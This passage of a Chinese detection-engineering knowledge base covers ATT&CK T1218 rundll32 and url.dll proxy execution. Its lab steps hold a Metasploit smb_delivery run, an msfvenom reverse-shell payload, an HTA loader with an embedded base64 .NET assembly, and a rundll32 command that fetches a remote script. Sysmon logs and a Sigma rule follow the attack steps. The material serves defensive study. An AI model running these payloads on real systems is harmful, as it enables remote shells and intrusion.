high\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#_8","title":"\u5efa\u8bae","text":"<p>\u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u6765\u68c0\u6d4b\u548c\u5206\u6790regsvr32.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u6bd4\u8f83regsvr32.exe\u7684\u8fd1\u671f\u8c03\u7528\u4e0e\u5386\u53f2\u5df2\u77e5\u5408\u6cd5\u53c2\u6570\u53ca\u5df2\u52a0\u8f7d\u6587\u4ef6\u6765\u786e\u5b9a\u662f\u5426\u6709\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u653b\u51fb\u6d3b\u52a8\u3002\u5728regsvr32.exe\u8c03\u7528\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u4e5f\u53ef\u7528\u4e8e\u786e\u5b9a\u6b63\u5728\u52a0\u8f7d\u7684\u811a\u672c\u6216\u8005\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u6765\u6e90\u548c\u76ee\u7684\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1218-010</p> <p>https://attack.mitre.org/techniques/T1218/010/</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/","title":"T1218-011-win-\u57fa\u4e8e\u767d\u540d\u5355Rundll32.exe\u6267\u884cpayload","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>Rundll32.exe\u7a0b\u5e8f\u53ef\u4ee5\u8c03\u7528\u6765\u6267\u884c\u4efb\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u529f\u80fd\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\uff0c\u4ece\u800c\u907f\u514d\u89e6\u53d1\u90a3\u4e9b\u53ef\u80fd\u4e0d\u4f1a\u76d1\u63a7rundll32.exe\u8fdb\u7a0b\u6267\u884c\u7684\u5b89\u5168\u5de5\u5177\uff0c\u56e0\u4e3a\u6b63\u5e38\u64cd\u4f5c\u4e2d\u4f7f\u7528rundll32.exe\u7684Windows\u4f1a\u6709\u767d\u540d\u5355\u6216\u8bef\u62a5\u3002</p> <p>Rundll32.exe\u53ef\u7528\u4e8e\u901a\u8fc7\u672a\u8bb0\u5f55\u7684shell32.dll\u51fd\u6570Control_RunDLL\u548c Control_RunDLLAsUser\u6765\u6267\u884c\u63a7\u5236\u9762\u677f\u9879\u76ee\u6587\u4ef6\uff08.cpl\uff09\u3002\u53cc\u51fb.cpl\u6587\u4ef6\u4e5f\u4f1a\u89e6\u53d1rundll32.exe\u6267\u884c\u3002</p> <p>Rundll32\u4e5f\u53ef\u7528\u4e8e\u6267\u884cJavaScript\u7b49\u811a\u672c\u3002\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u7684\u8bed\u6cd5\u6765\u5b8c\u6210\uff1arundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\" \u3002\u8fd9\u79cd\u65b9\u6cd5\u5df2\u88ab\u6076\u610f\u8f6f\u4ef6\u5982Poweliks\u6240\u4f7f\u7528\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Rundll32.exe\u662f\u6307\u201c\u6267\u884c32\u4f4d\u7684DLL\u6587\u4ef6\u201d\u3002\u5b83\u7684\u4f5c\u7528\u662f\u6267\u884cDLL\u6587\u4ef6\u4e2d\u7684\u5185\u90e8\u51fd\u6570,\u529f\u80fd\u5c31\u662f\u4ee5\u547d\u4ee4\u884c\u7684\u65b9\u5f0f\u8c03\u7528\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\u5e93\u3002</p> <p>\u8bf4\u660e\uff1aRundll32.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cWmic\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u9700\u6ce8\u610fx86\uff0cx64\u4f4d\u7684Rundll32\u8c03\u7528\u3002</p> <p>windows 2003\u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <pre><code>C:\\Windows\\System32\\rundll32.exe\nC:\\Windows\\SysWOW64\\rundll32.exe\n</code></pre> <p>win7\u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <pre><code>C:\\Windows\\System32\\rundll32.exe\nC:\\Windows\\SysWOW64\\rundll32.exe\n</code></pre> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> <p>\u9776\u673a\uff1awin7\uff08sysmon\u65e5\u5fd7\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#_5","title":"\u653b\u51fb\u5206\u6790","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#msf","title":"\u914d\u7f6eMSF","text":"<pre><code>msf5 &gt; use exploit/windows/smb/smb_delivery\nmsf5 exploit(windows/smb/smb_delivery) &gt; set srvhost 192.168.126.146\nsrvhost =&gt; 192.168.126.146\nmsf5 exploit(windows/smb/smb_delivery) &gt; exploit\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[*] Started reverse TCP handler on 192.168.126.146:4444\n[*] Started service listener on 192.168.126.146:445\n[*] Server started.\n[*] Run the following command on the target machine:\nrundll32.exe \\\\192.168.126.146\\huwSj\\test.dll,0\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#payload","title":"\u9776\u673a\u6267\u884cpayload","text":"<pre><code>rundll32.exe \\\\192.168.126.146\\huwSj\\test.dll,0\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#shell","title":"\u53cd\u5f39shell","text":"<pre><code>msf5 exploit(windows/smb/smb_delivery) &gt; [*] Sending stage (180291 bytes) to 192.168.126.149\n[*] Meterpreter session 1 opened (192.168.126.146:4444 -&gt; 192.168.126.149:49381) at 2020-04-17 15:24:05 +0800\nmsf5 exploit(windows/smb/smb_delivery) &gt; sessions\n\nActive sessions\n===============\n\nId  Name  Type                     Information                         Connection\n  --  ----  ----                     -----------                         ----------\n  1         meterpreter x86/windows  12306Br0-PC\\12306Br0 @ 12306BR0-PC  192.168.126.146:4444 -&gt; 192.168.126.149:49381 (192.168.126.149)\nmsf5 exploit(windows/smb/smb_delivery) &gt; sessions 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; getuid\nServer username: 12306Br0-PC\\12306Br0\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#_6","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>sysmon\u65e5\u5fd7\u8bb0\u5f55</p> <pre><code>EVentID: 1\nImage: C:\\Windows\\SysWOW64\\rundll32.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Windows host process (Rundll32)\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: RUNDLL32.EXE\nCommandLine: rundll32.exe  \\\\192.168.126.146\\huwSj\\test.dll,0\n</code></pre> <p>win7\u5b89\u5168\u65e5\u5fd7\u8bb0\u5f55</p> <pre><code>EVentID: 4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID: 0xa30\n\u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\SysWOW64\\rundll32.exe\n\nEVentID: 5158\n\u5e94\u7528\u7a0b\u5e8f\u4fe1\u606f:\n\u8fdb\u7a0b ID: 2608\n\u5e94\u7528\u7a0b\u5e8f\u540d\u79f0: \\device\\harddiskvolume2\\windows\\syswow64\\rundll32.exe\n\nEVentID: 5156 #Windows \u7b5b\u9009\u5e73\u53f0\u5df2\u5141\u8bb8\u8fde\u63a5\u3002\n\u5e94\u7528\u7a0b\u5e8f\u4fe1\u606f:\n\u8fdb\u7a0b ID:2608\n\u5e94\u7528\u7a0b\u5e8f\u540d\u79f0: \\device\\harddiskvolume2\\windows\\syswow64\\rundll32.exe\n\n\u7f51\u7edc\u4fe1\u606f:\n\u65b9\u5411: \u51fa\u7ad9\n\u6e90\u5730\u5740: 192.168.126.149\n\u6e90\u7aef\u53e3: 49381\n\u76ee\u6807\u5730\u5740: 192.168.126.146\n\u76ee\u6807\u7aef\u53e3: 4444\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#_7","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#sigma","title":"sigma","text":"<pre><code>title: Suspicious Call by Ordinal\nid: e79a9e79-eb72-4e78-a628-0e7e8f59e89c\ndescription: Detects suspicious calls of DLLs in rundll32.dll exports by ordinal\nstatus: experimental\nreferences:\n    - https://techtalk.pcmatic.com/2017/11/30/running-dll-files-malware-analysis/\n    - https://github.com/Neo23x0/DLLRunner\n    - https://twitter.com/cyb3rops/status/1186631731543236608\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1085\nauthor: Florian Roth\ndate: 2019/10/22\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine: '*\\rundll32.exe *,#*'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\n    - Windows contol panel elements have been identified as source (mmc)\nlevel: high\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#_8","title":"\u5efa\u8bae","text":"<p>\u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u6765\u68c0\u6d4b\u548c\u5206\u6790rundll32.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u6bd4\u8f83rundll32.exe\u7684\u8fd1\u671f\u8c03\u7528\u4e0e\u5386\u53f2\u5df2\u77e5\u5408\u6cd5\u53c2\u6570\u53ca\u5df2\u52a0\u8f7d\u52a8\u6001\u94fe\u63a5\u5e93\u6765\u786e\u5b9a\u662f\u5426\u6709\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u653b\u51fb\u6d3b\u52a8\u3002\u5728rundll32.exe\u8c03\u7528\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u4e5f\u53ef\u7528\u4e8e\u786e\u5b9a\u6b63\u5728\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u6765\u6e90\u548c\u76ee\u7684\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1218-011</p> <p>https://attack.mitre.org/techniques/T1218/011/</p> <p>windows\u4e0b\u57fa\u4e8e\u767d\u540d\u5355\u83b7\u53d6shell\u7684\u65b9\u6cd5\u6574\u7406\uff08\u4e0a\uff09</p> <p>http://www.safe6.cn/article/155</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/","title":"T1218-011-win-\u57fa\u4e8e\u767d\u540d\u5355url.dll\u6267\u884cpayload","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>Rundll32.exe\u7a0b\u5e8f\u53ef\u4ee5\u8c03\u7528\u6765\u6267\u884c\u4efb\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u529f\u80fd\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\uff0c\u4ece\u800c\u907f\u514d\u89e6\u53d1\u90a3\u4e9b\u53ef\u80fd\u4e0d\u4f1a\u76d1\u63a7rundll32.exe\u8fdb\u7a0b\u6267\u884c\u7684\u5b89\u5168\u5de5\u5177\uff0c\u56e0\u4e3a\u6b63\u5e38\u64cd\u4f5c\u4e2d\u4f7f\u7528rundll32.exe\u7684Windows\u4f1a\u6709\u767d\u540d\u5355\u6216\u8bef\u62a5\u3002</p> <p>Rundll32.exe\u53ef\u7528\u4e8e\u901a\u8fc7\u672a\u8bb0\u5f55\u7684shell32.dll\u51fd\u6570Control_RunDLL\u548c Control_RunDLLAsUser\u6765\u6267\u884c\u63a7\u5236\u9762\u677f\u9879\u76ee\u6587\u4ef6\uff08.cpl\uff09\u3002\u53cc\u51fb.cpl\u6587\u4ef6\u4e5f\u4f1a\u89e6\u53d1rundll32.exe\u6267\u884c\u3002</p> <p>Rundll32\u4e5f\u53ef\u7528\u4e8e\u6267\u884cJavaScript\u7b49\u811a\u672c\u3002\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u7684\u8bed\u6cd5\u6765\u5b8c\u6210\uff1arundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\" \u3002\u8fd9\u79cd\u65b9\u6cd5\u5df2\u88ab\u6076\u610f\u8f6f\u4ef6\u5982Poweliks\u6240\u4f7f\u7528\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>url.dll\u662fInternet\u5feb\u6377\u58f3\u6269\u5c55\u76f8\u5173\u5e94\u7528\u7a0b\u5e8f\u63a5\u53e3\u7cfb\u7edf\u6587\u4ef6\u3002</p> <p>\u8bf4\u660e\uff1aurl.dll\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0curl.dll\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u4f46\u7531\u4e8e\u4e3adll\u6587\u4ef6\uff0c\u9700\u8c03\u7528rundll32.exe\u6765\u6267\u884c\u3002</p> <p>Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <p>C:\\Windows\\System32\\url.dll</p> <p>C:\\Windows\\SysWOW64\\url.dll</p> <p>Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <p>C:\\Windows\\System32\\url.dll</p> <p>C:\\Windows\\SysWOW64\\url.dll</p> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> <p>\u9776\u673a\uff1awin7\uff08sysmon\u65e5\u5fd7\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_5","title":"\u653b\u51fb\u5206\u6790","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#msf","title":"\u914d\u7f6eMSF","text":"<pre><code>msf5 exploit(multi/handler) &gt; back\nmsf5 &gt; use exploit/multi/handler\nmsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) &gt; set lhost 192.168.126.146\nlhost =&gt; 192.168.126.146\nmsf5 exploit(multi/handler) &gt; set lport 4444\nlport =&gt; 4444\nmsf5 exploit(multi/handler) &gt; exploit\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#shellbin","title":"\u9776\u673a\u6267\u884cshell.bin","text":"<pre><code>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444  -f raw &gt; shell.bin\n\ncat shell.bin |base64 -w 0\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#payload","title":"\u66ff\u6362payload","text":"<p>\u5c06\u751f\u6210\u7684payload\u590d\u5236\u5230code\u5904\u3002\u4fdd\u5b58\u4e3ashell.hta</p> <pre><code>&lt;script language=\"VBScript\"&gt;\n\nDim binary : binary =\"rundll32.exe\"\n\nDim code : code =\"payload\"//payload\u63d2\u5165\n\n Sub Debug(s)\n End Sub\n Sub SetVersion\n\n End Sub\n\n\nFunction Base64ToStream(b)\nDim enc, length, ba, transform, ms\nSet enc = CreateObject(\"System.Text.ASCIIEncoding\")\nlength = enc.GetByteCount_2(b)\nSet transform = CreateObject(\"System.Security.Cryptography.FromBase64Transform\")\nSet ms = CreateObject(\"System.IO.MemoryStream\")\nms.Write transform.TransformFinalBlock(enc.GetBytes_4(b),0, length),0,((length /4)*3)\nms.Position =0\nSet Base64ToStream = ms\nEnd Function\n\nSub Run\nDim s, entry_class\ns =\"AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy\"\ns = s &amp;\"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph\"\ns = s &amp;\"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk\"\ns = s &amp;\"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD\"\ns = s &amp;\"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl\"\ns = s &amp;\"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU\"\ns = s &amp;\"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl\"\ns = s &amp;\"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90\"\ns = s &amp;\"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu\"\ns = s &amp;\"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH\"\ns = s &amp;\"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA\"\ns = s &amp;\"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw\"\ns = s &amp;\"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu\"\ns = s &amp;\"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA\"\ns = s &amp;\"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u\"\ns = s &amp;\"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5\"\ns = s &amp;\"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR\"\ns = s &amp;\"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA\"\ns = s &amp;\"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y\"\ns = s &amp;\"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh\"\ns = s &amp;\"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz\"\ns = s &amp;\"ZW1ibHkGFwAAAARMb2FkCg8MAAAAAB4AAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA\"\ns = s &amp;\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy\"\ns = s &amp;\"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAkNhXWQAAAAAA\"\ns = s &amp;\"AAAA4AAiIAsBMAAAFgAAAAYAAAAAAAByNQAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA\"\ns = s &amp;\"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAIDUA\"\ns = s &amp;\"AE8AAAAAQAAAkAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\ns = s &amp;\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA\"\ns = s &amp;\"AAAALnRleHQAAAB4FQAAACAAAAAWAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAkAMAAABA\"\ns = s &amp;\"AAAABAAAABgAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAcAAAAAAAAAAAA\"\ns = s &amp;\"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAFQ1AAAAAAAASAAAAAIABQD4IQAAKBMAAAEAAAAAAAAA\"\ns = s &amp;\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgIoDwAACioT\"\ns = s 